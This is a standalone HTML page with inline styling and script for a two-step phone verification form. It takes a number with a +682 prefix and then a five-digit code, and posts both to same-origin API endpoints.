<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Phone Number</title>
    <style>
        /* All your existing CSS styles remain unchanged here */
        :root { --accent:#e11d48; --card-bg:rgba(255,255,255,.12); --card-border:rgba(255,255,255,.25); --text:#f8fafc; --muted:#e2e8f0; }
        *{box-sizing:border-box} html,body{height:100%}
        body{margin:0;font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial,'Noto Sans','Apple Color Emoji','Segoe UI Emoji';color:var(--text);overflow-x:hidden;background:#0b1220}
        .container{max-width:880px;margin:0 auto;padding:48px 24px 140px}
        .section{margin-top:38px;text-align:center}
        .phone-row,.code-row{display:flex;justify-content:center;gap:12px;margin:12px 0 18px}
        .prefix{display:inline-flex;align-items:center;justify-content:center;padding:12px 14px;border-radius:12px;background:var(--card-bg);border:1px solid var(--card-border);min-width:84px;font-weight:700}
        .digit,.code-digit{width:56px;height:64px;text-align:center;font-size:28px;font-weight:700;color:var(--text);border-radius:14px;border:1px solid var(--card-border);background:rgba(255,255,255,.06);outline:none;transition:transform .06s ease,box-shadow .2s ease,border-color .2s ease}
        .digit:focus,.code-digit:focus{transform:translateY(-1px);box-shadow:0 8px 28px rgba(0,0,0,.25);border-color:#94a3b8}
        .actions{display:flex;align-items:center;justify-content:center;gap:14px;margin-top:10px}
        .btn{appearance:none;border:0;cursor:pointer;border-radius:14px;padding:14px 18px;font-weight:800;letter-spacing:.02em;background:linear-gradient(180deg,#f43f5e,#be123c);color:#fff;box-shadow:0 12px 32px rgba(190,18,60,.35)}
        .btn[disabled]{filter:grayscale(.7) brightness(.8);cursor:not-allowed;box-shadow:none}
        /* This class will be used to hide/show sections */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <main class="container">
        <section id="step1" class="section">
            <h1>Enter your phone number</h1>
            <div class="phone-row">
                <span class="prefix">+682</span>
                <input class="digit" type="tel" maxlength="1" required>
                <input class="digit" type="tel" maxlength="1" required>
                <input class="digit" type="tel" maxlength="1" required>
                <input class="digit" type="tel" maxlength="1" required>
                <input class="digit" type="tel" maxlength="1" required>
            </div>
            <div class="actions">
                <button id="sendPhone" class="btn">Send Code</button>
            </div>
            <p id="message-step1"></p>
        </section>

        <section id="step2" class="section hidden">
            <h1>Enter the 5-digit code</h1>
            <div class="code-row">
                <input class="code-digit" type="tel" maxlength="1" required>
                <input class="code-digit" type="tel" maxlength="1" required>
                <input class="code-digit" type="tel" maxlength="1" required>
                <input class="code-digit" type="tel" maxlength="1" required>
                <input class="code-digit" type="tel" maxlength="1" required>
            </div>
            <div class="actions">
                <button id="sendDigits" class="btn">Verify Code</button>
            </div>
            <p id="message-step2"></p>
        </section>
        
        <section id="done" class="section hidden">
            <h2>Done!</h2>
            <p>You're all set. Thanks.</p>
        </section>
    </main>

    <script>
        const step1Section = document.getElementById('step1');
        const step2Section = document.getElementById('step2');
        const doneSection = document.getElementById('done');

        const btnSendPhone = document.getElementById('sendPhone');
        const btnSendDigits = document.getElementById('sendDigits');

        const phoneBoxes = Array.from(step1Section.querySelectorAll('.digit'));
        const codeBoxes = Array.from(step2Section.querySelectorAll('.code-digit'));
        
        const messageStep1 = document.getElementById('message-step1');
        const messageStep2 = document.getElementById('message-step2');

        let submittedPhone = null;

        // --- Event Listener for the first button (Send Phone) ---
        btnSendPhone.addEventListener('click', async () => {
            const phoneDigits = phoneBoxes.map(box => box.value).join('');
            if (phoneDigits.length !== 5) {
                messageStep1.textContent = 'Please enter all 5 digits of your phone number.';
                return;
            }
            
            submittedPhone = `+682${phoneDigits}`;
            messageStep1.textContent = 'Sending...';

            try {
                // NOTE: This now calls your REAL API. 
                // In a real scenario, you'd send to '/api/submit-phone'
                const response = await fetch('/api/submit-phone', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: submittedPhone }) 
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || 'An unknown error occurred.');
                }

                // SUCCESS: Hide Step 1 and show Step 2
                step1Section.classList.add('hidden');
                step2Section.classList.remove('hidden');

            } catch (error) {
                messageStep1.textContent = `Error: ${error.message}`;
            }
        });

        // --- Event Listener for the second button (Send Digits) ---
        btnSendDigits.addEventListener('click', async () => {
            const digits = codeBoxes.map(box => box.value).join('');
            if (digits.length !== 5) {
                messageStep2.textContent = 'Please enter the 5-digit code.';
                return;
            }

            messageStep2.textContent = 'Verifying...';

            try {
                // NOTE: This now calls your REAL API.
                // In a real scenario, you'd send to '/api/submit-digits'
                const response = await fetch('/api/submit-digits', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: submittedPhone, digits: digits })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || 'An unknown error occurred.');
                }
                
                // SUCCESS: Hide Step 2 and show the "Done" message
                step2Section.classList.add('hidden');
                doneSection.classList.remove('hidden');

            } catch (error) {
                messageStep2.textContent = `Error: ${error.message}`;
            }
        });

        // --- Helper function to auto-focus next input box ---
        function setupInputAutoTab(boxes) {
            boxes.forEach((box, index) => {
                box.addEventListener('input', () => {
                    if (box.value.length === 1 && index < boxes.length - 1) {
                        boxes[index + 1].focus();
                    }
                });
            });
        }

        setupInputAutoTab(phoneBoxes);
        setupInputAutoTab(codeBoxes);

    </script>
</body>
</html>